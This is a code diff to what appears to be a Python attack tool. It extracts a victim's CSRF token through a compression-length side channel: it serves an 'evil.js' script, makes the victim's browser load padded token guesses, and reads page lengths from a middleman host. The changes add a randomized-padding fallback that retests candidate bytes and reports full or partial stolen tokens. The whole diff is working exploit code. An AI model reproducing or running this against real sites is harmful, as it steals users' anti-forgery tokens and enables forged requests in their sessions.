@@ -6,6 +6,7 @@ import logging
 import requests
 import queue
 import typing
+import random
 
 MIDDLEMAN_HOST = '172.31.217.234'
 MIDDLEMAN_PORT = 7000
@@ -85,6 +86,9 @@ def gen_padded(st: str):
     global padding
     return st + padding, padding[:len(padding)//2] + st + padding[len(padding)//2:]
 
+def gen_padded_slow(st: str):
+    padding = ''.join(random.choices(['-','.',',','_','$','~'],k=16))
+    return st + padding, padding[:len(padding)//2] + st + padding[len(padding)//2:]
 
 @app.route("/evil.js")
 def serve_evil_js():
@@ -105,17 +109,33 @@ def crack(ws: ws.Server):
         ping = requests.get(f"http://{MIDDLEMAN_HOST}:{MIDDLEMAN_PORT}/",timeout=3)
         if ping.status_code // 100 != 2:
             ping.raise_for_status()
-        current_token = ''
-        def get_len(token: str) -> int:
-            with MiddlemanSession(MIDDLEMAN_HOST,MIDDLEMAN_PORT) as session:
-                session.clear_conversations()
-                ws.send(f"iframe\n{token}")
-                if ws.receive() != 'page_loaded':
-                    raise ValueError("client error")
-                return session.get_page_len()
+
         def test_with_padding(ch: str) -> bool:
+                
             with MiddlemanSession(MIDDLEMAN_HOST,MIDDLEMAN_PORT) as session:
                 p1, p2 = gen_padded(ch)
+
+                shorter = current_token + p1
+                longer = current_token + p2
+                
+                session.clear_conversations()
+                ws.send(f'iframe\n{shorter}')
+                if ws.receive() != 'page_loaded':
+                    raise ValueError("client error")
+                l1 = session.get_page_len()
+
+                session.clear_conversations()
+                ws.send(f"iframe\n{longer}")
+                if ws.receive() != 'page_loaded':
+                    raise ValueError("client error")
+                l2 = session.get_page_len()
+
+                return l1 < l2
+            
+        def test_with_padding_slow(ch: str) -> bool:
+                
+            with MiddlemanSession(MIDDLEMAN_HOST,MIDDLEMAN_PORT) as session:
+                p1, p2 = gen_padded_slow(ch)
 
                 shorter = current_token + p1
                 longer = current_token + p2
@@ -142,17 +162,35 @@ def crack(ws: ws.Server):
             if len(current_token) == CSRF_LEN:
                 possible_tokens.append(current_token)
                 continue
-
+            ws.send(f"update_token\n{current_token}")
+            
+            found=False
             for possible_byte in HEX_ALPHABET:
                 if test_with_padding(possible_byte):
                     token_candidates.put_nowait(current_token + possible_byte)
+                    found = True
+            
+            if not found:
+                best_proportion = -1.
+                best_byte = None
+                for possible_byte in HEX_ALPHABET:
+                    tests = [test_with_padding_slow(possible_byte) for _ in range(5)]
+                    p = tests.count(True)/len(tests)
+                    if p > best_proportion:
+                        best_proportion = p
+                        best_byte = possible_byte
+                
+                token_candidates.put_nowait(current_token + best_byte)
 
-
-        ws.send("done\ntoken extracted")
-        ws.close_reason = "token extracted"
-        ws.close()
+        if len(possible_tokens) > 0:
+            ws.send(f"done\ntoken extracted:{current_token}")
+            ws.close_reason = "token extracted"
+            ws.close()
+        else:
+            ws.send(f"done\nPartial token extracted:{current_token}")
+            ws.close()
     except Exception as e:
-        ws.send(f"done\n{e}")
+        ws.send(f"done\nerror:{e}")
         ws.close_reason = str(e)
         ws.close()
         raise e
